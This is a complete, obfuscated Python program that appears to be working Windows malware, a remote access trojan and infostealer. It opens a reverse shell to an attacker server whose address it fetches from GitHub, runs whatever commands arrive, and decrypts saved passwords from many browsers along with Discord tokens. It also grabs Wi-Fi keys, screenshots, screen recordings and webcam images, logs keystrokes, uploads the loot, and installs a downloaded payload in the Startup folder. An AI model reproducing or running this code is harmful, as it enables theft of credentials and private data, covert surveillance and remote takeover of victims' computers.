import urllib.request,subprocess,socket,time,os,json,base64,shutil,re
from datetime import datetime
JhdwZaiWyUO = ""
jksxMVTCpdZIQCeQRp = ""
QzONESuyorqZdwOrfRDJ = "28.04.25.1"
CpzWfpjIiU = True
qetnlcFCUIyrFymhiPbsl = "!"
rCjWwNopAKAUpLcxZhhW = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
gSLmiEvosxcgsuxhhj = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
GcTyXCcp = os.path.expanduser("~\\AppData\\Local\\")
nFZmMRLfdSJTELvnHXxwk = os.path.expanduser("~\\AppData\\Roaming\\")
OSXijscUooTb = ""
POKmayiNOomTfVHxpOZwR = {
	'chrome':GcTyXCcp+'Google\\Chrome\\User Data','chromium':GcTyXCcp+'Chromium\\User Data','chrome-canary':GcTyXCcp+'Google\\Chrome SxS\\User Data',
	'msedge':GcTyXCcp+'Microsoft\\Edge\\User Data','msedge-canary':GcTyXCcp+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':GcTyXCcp+'Microsoft\\Edge Beta\\User Data','msedge-dev':GcTyXCcp+'Microsoft\\Edge Dev\\User Data',
	'avast':GcTyXCcp+'AVAST Software\\Browser\\User Data','amigo':GcTyXCcp+'Amigo\\User Data',
	'torch':GcTyXCcp+'Torch\\User Data','kometa':GcTyXCcp+'Kometa\\User Data','orbitum':GcTyXCcp+'Orbitum\\User Data',
	'cent-browser':GcTyXCcp+'CentBrowser\\User Data','7star':GcTyXCcp+'7Star\\7Star\\User Data',
	'sputnik':GcTyXCcp+'Sputnik\\Sputnik\\User Data','vivaldi':GcTyXCcp+'Vivaldi\\User Data',
	'epic-privacy-browser':GcTyXCcp+'Epic Privacy Browser\\User Data','uran':GcTyXCcp+'uCozMedia\\Uran\\User Data',
	'yandex':GcTyXCcp+'Yandex\\YandexBrowser\\User Data','brave':GcTyXCcp+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':GcTyXCcp+'Iridium\\User Data','coccoc':GcTyXCcp+'CocCoc\\Browser\\User Data',
	'opera':nFZmMRLfdSJTELvnHXxwk+'Opera Software\\Opera Stable','opera-gx':nFZmMRLfdSJTELvnHXxwk+'Opera Software\\Opera GX Stable'
}
def LtmGBcJcYLVftwasmxaV(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def sFclbFSCL(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	YEiAzpgq = data.decode("utf-8").replace("\n","")
	if not YEiAzpgq.startswith(qetnlcFCUIyrFymhiPbsl):
		proc = subprocess.run(YEiAzpgq, shell=True, capture_output=True)
		MkVGsBoYqJaArfeBHFB = proc.stdout + proc.stderr
		OwPzpFRbJjWuFXmKsovt(s, MkVGsBoYqJaArfeBHFB)
		return
	sAoFluBJhCnfyGTZbuXamQY = YEiAzpgq.split(" ")[0][1:]
	args = " ".join(YEiAzpgq.split()[1:]).split()
	if sAoFluBJhCnfyGTZbuXamQY == "download":
		qpnKhhZgeeOmlExgKhvCqFA(s, YEiAzpgq)
	elif sAoFluBJhCnfyGTZbuXamQY == "screenshot":
		AYZIcrnbAfCYxZqhQw(s)
	elif sAoFluBJhCnfyGTZbuXamQY == "basename":
		OwPzpFRbJjWuFXmKsovt(s, os.path.basename(__file__))
	elif sAoFluBJhCnfyGTZbuXamQY == "update":
		fvgKKeSpDYsdfTcfKSot(s)
	elif sAoFluBJhCnfyGTZbuXamQY == "wifi":
		GmPwLalGBeQvBPnyxKg(s)
	elif sAoFluBJhCnfyGTZbuXamQY == "screenrecord":
		XCgJBMHxrgp(s, args)
	elif sAoFluBJhCnfyGTZbuXamQY == "browsers":
		IxGLwDaP(s)
	elif sAoFluBJhCnfyGTZbuXamQY == "webcam":
		webCam(s, args)
	elif sAoFluBJhCnfyGTZbuXamQY == "cd":
		moveDirectory(s, YEiAzpgq[4:])
	else:
		OwPzpFRbJjWuFXmKsovt(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		OwPzpFRbJjWuFXmKsovt(s,"")
	except:
		OwPzpFRbJjWuFXmKsovt(s, "[!] 404")
def qpnKhhZgeeOmlExgKhvCqFA(s, YEiAzpgq):
	fBGYAOLea = YEiAzpgq.replace(qetnlcFCUIyrFymhiPbsl+"download ","").split(",")
	MkVGsBoYqJaArfeBHFBs = ""
	for f in fBGYAOLea:
		MkVGsBoYqJaArfeBHFBs += IVBTJnmvTpgHy(f, "api/file/", { "type":os.path.splitext(f)[1] })
	OwPzpFRbJjWuFXmKsovt(s, MkVGsBoYqJaArfeBHFBs)
def AYZIcrnbAfCYxZqhQw(s):
	from PIL import ImageGrab
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	gUJbBzRhWGj = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(gUJbBzRhWGj)
	image.close()
	MkVGsBoYqJaArfeBHFB = IVBTJnmvTpgHy(gUJbBzRhWGj, "api/sscap")
	os.remove(gUJbBzRhWGj)
	OwPzpFRbJjWuFXmKsovt(s, MkVGsBoYqJaArfeBHFB)
def webCam(s, args):
	import cv2
	cameraNumber = 0
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = cv2.VideoCapture(cameraNumber)
		_, frame = cam.read()
		cv2.imwrite(GcTyXCcp+"wc.jpg", frame)
		cam.release()
		r=IVBTJnmvTpgHy(GcTyXCcp+"wc.jpg","api/wc")
		OwPzpFRbJjWuFXmKsovt(s, r)
	except Exception as e:
		OwPzpFRbJjWuFXmKsovt(s, "[!] 404: "+str(e))
def XCgJBMHxrgp(s, args):
	import imageio
	from PIL import ImageGrab
	yHSkoiB = 15
	if not args == []:
		try: yHSkoiB = int(args[0])
		except: pass
	ZllJychzHTMVmupTc = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	wbfEjbDUv = []
	fps = 11
	numFrames = yHSkoiB * fps
	for _ in range(numFrames):
		wbfEjbDUv.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(ZllJychzHTMVmupTc, wbfEjbDUv, fps=fps, quality=8)
	r=IVBTJnmvTpgHy(ZllJychzHTMVmupTc, "api/screc")
	os.remove(ZllJychzHTMVmupTc)
	OwPzpFRbJjWuFXmKsovt(s, r)
def IVBTJnmvTpgHy(vaCBcHSERZQyhYpBHcicMtu, CoPnbwCwgIBhpKNM, pUAODVtPWCgUQhYMwLkZJ=None):
	import requests
	if not os.path.isfile(vaCBcHSERZQyhYpBHcicMtu):
		return "[!] 404: "+vaCBcHSERZQyhYpBHcicMtu+"\n"
	headers = {"user":os.getlogin()}
	if pUAODVtPWCgUQhYMwLkZJ is not None:
		headers = {**headers, **pUAODVtPWCgUQhYMwLkZJ}
	f = open(vaCBcHSERZQyhYpBHcicMtu, "rb")
	requests.post("http://"+JhdwZaiWyUO+":5555/"+CoPnbwCwgIBhpKNM,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def KlObFLbSexD(onbVGpHmpronZabbn, CoPnbwCwgIBhpKNM):
	import requests
	if onbVGpHmpronZabbn.strip() == "":
		return "[!] 204"
	requests.post("http://"+JhdwZaiWyUO+":5555/"+CoPnbwCwgIBhpKNM,
		data=onbVGpHmpronZabbn,
		headers={"user":os.getlogin()})
	return "[+] 200"
def fvgKKeSpDYsdfTcfKSot(s):
	h, p, v = jQvwkOKkmy(True)
	if (v != QzONESuyorqZdwOrfRDJ):
		ckoPpwDetlvkZBuoocLiAna(v)
		OwPzpFRbJjWuFXmKsovt(s, "[+] 200")
	else:
		OwPzpFRbJjWuFXmKsovt(s, "[-] 304")
def GmPwLalGBeQvBPnyxKg(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		OwPzpFRbJjWuFXmKsovt(s, "[!] 500")
		return
	bSgeKxCuZWFMz = ""
	for p in profiles:
		try: bSgeKxCuZWFMz+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: bSgeKxCuZWFMz+=f"    {p} - N/A"
	OwPzpFRbJjWuFXmKsovt(s, bSgeKxCuZWFMz)
def ckoPpwDetlvkZBuoocLiAna(NqsPWFMadldoYhHgElV):
	import requests
	global CpzWfpjIiU
	HMZEENXCAQO = os.path.basename(__file__)
	fileType = HMZEENXCAQO.split(".")[-1]
	oxuTtxkGapIiMsNMNWGsV = HMZEENXCAQO.split(".")[0]+"."+NqsPWFMadldoYhHgElV+".pyw" if fileType.startswith("py") else ".exe"
	thtPNeWVK = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), oxuTtxkGapIiMsNMNWGsV)
	if not os.path.isfile(thtPNeWVK):
		with open(thtPNeWVK, "w+") as f:
			f.write(requests.get(gSLmiEvosxcgsuxhhj+"file."+ "pyw" if thtPNeWVK.split(".")[-1].startswith("py") else "exe").text)
	else:
		CpzWfpjIiU = False
def jQvwkOKkmy(force=False):
	global JhdwZaiWyUO, jksxMVTCpdZIQCeQRp
	if force or JhdwZaiWyUO == "" or jksxMVTCpdZIQCeQRp == "":
		while True:
			try:
				with urllib.request.urlopen(rCjWwNopAKAUpLcxZhhW) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					JhdwZaiWyUO = data[0].strip()
					jksxMVTCpdZIQCeQRp = data[1].strip()
					NqsPWFMadldoYhHgElV = data[2].strip()
					return JhdwZaiWyUO, jksxMVTCpdZIQCeQRp, NqsPWFMadldoYhHgElV
			except:
				time.sleep(10)
def uJmgkUUYCpKUavK():
	try:
		WEHbZTjKSVweODYMGCLZ = "settings.xpb"
		gzpbbujnpCm = sorted([file for file in os.listdir(GcTyXCcp) if os.path.isfile(GcTyXCcp+"\\"+file) and file.endswith(WEHbZTjKSVweODYMGCLZ.split(".")[-1])])
		if WEHbZTjKSVweODYMGCLZ in gzpbbujnpCm:
			gzpbbujnpCm.remove(WEHbZTjKSVweODYMGCLZ)
		mCGXQQAwFhsUuzdxxyQSEFX = os.path.join(GcTyXCcp,WEHbZTjKSVweODYMGCLZ)
		if len(gzpbbujnpCm) > 0:
			with open(mCGXQQAwFhsUuzdxxyQSEFX, "ab+") as f:
				for file in gzpbbujnpCm:
					temp = os.path.join(GcTyXCcp,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		IVBTJnmvTpgHy(mCGXQQAwFhsUuzdxxyQSEFX, "api/log")
		if os.path.isfile(mCGXQQAwFhsUuzdxxyQSEFX):
			os.remove(mCGXQQAwFhsUuzdxxyQSEFX)
	except:
		pass
def MewWoNiPEwguEyZU():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(GcTyXCcp+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def fPVhXNQQHIQrIebUnKgZFAR(k):
		logging.info(str(k))
	k=Listener(on_press=fPVhXNQQHIQrIebUnKgZFAR)
	fNOOqDK = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in fNOOqDK:
		l.setLevel(logging.CRITICAL)
	k.start()
def IxGLwDaP(s, upload=False):
        import requests,sqlite3,win32crypt
        from Cryptodome.Cipher import AES
        YmKceykGhmgvVfOdJL = "\n"
        for browser in POKmayiNOomTfVHxpOZwR:
                path = POKmayiNOomTfVHxpOZwR[browser]
                cSEEdWoBjqslesjAw = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        cSEEdWoBjqslesjAw = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", GcTyXCcp+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(GcTyXCcp+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        YmKceykGhmgvVfOdJL += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(cSEEdWoBjqslesjAw, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                YmKceykGhmgvVfOdJL += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(GcTyXCcp+"\\db.db")
        VGGEgBWHAvjPQKtbBhYKAtE = []
        discordPaths = [nFZmMRLfdSJTELvnHXxwk+'\\discord\\Local Storage\\leveldb\\',nFZmMRLfdSJTELvnHXxwk+'\\discordcanary\\Local Storage\\leveldb\\',nFZmMRLfdSJTELvnHXxwk+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                cSEEdWoBjqslesjAw = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        cSEEdWoBjqslesjAw = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(cSEEdWoBjqslesjAw, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in VGGEgBWHAvjPQKtbBhYKAtE:
                                                VGGEgBWHAvjPQKtbBhYKAtE.append(decryptedToken)
        zhZZTjPq = "https://discord.com/api/v9/users/@me"
        if VGGEgBWHAvjPQKtbBhYKAtE: YmKceykGhmgvVfOdJL +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for TOTNDvZzQWWYJzWawuuq in VGGEgBWHAvjPQKtbBhYKAtE:
                headers = {"Content-Type":"application/json","Authorization":TOTNDvZzQWWYJzWawuuq,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(zhZZTjPq, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try:
                        nitro_data = requests.get(zhZZTjPq+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(zhZZTjPq+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                YmKceykGhmgvVfOdJL += f"\n{user}\n{'-'*len(user)}\nToken: {TOTNDvZzQWWYJzWawuuq}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        YmKceykGhmgvVfOdJL += "\n\n"
        if not upload:
                OwPzpFRbJjWuFXmKsovt(s, YmKceykGhmgvVfOdJL)
        else:
                KlObFLbSexD(YmKceykGhmgvVfOdJL, "api/google")
def OwPzpFRbJjWuFXmKsovt(clientSocket, onbVGpHmpronZabbn):
	formattedData = b""
	if type(onbVGpHmpronZabbn) == bytes:
		formattedData += onbVGpHmpronZabbn
	else:
		formattedData += bytes(onbVGpHmpronZabbn, "utf-8")
	formattedData += bytes("\n"+OSXijscUooTb+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def bjyHtoct():
	global OSXijscUooTb
	h, p, v = jQvwkOKkmy()
	try: uJmgkUUYCpKUavK()
	except: pass
	try:
		if QzONESuyorqZdwOrfRDJ != v:
			ckoPpwDetlvkZBuoocLiAna(v)
	except: pass
	try:
		if CpzWfpjIiU:
			IxGLwDaP(None,True)
	except: pass
	try:
		if CpzWfpjIiU:
			MewWoNiPEwguEyZU()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	OSXijscUooTb = ("(old)"if QzONESuyorqZdwOrfRDJ!=v else "")+"["+QzONESuyorqZdwOrfRDJ+"] "+os.getlogin()+" - "
	while True:
		uVUkHKKsyx=False
		try:
			s=LtmGBcJcYLVftwasmxaV(h, p)
			OwPzpFRbJjWuFXmKsovt(s, "")
			while not uVUkHKKsyx:
				try: uVUkHKKsyx=sFclbFSCL(s)
				except Exception as e:
					OwPzpFRbJjWuFXmKsovt(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
bjyHtoct()
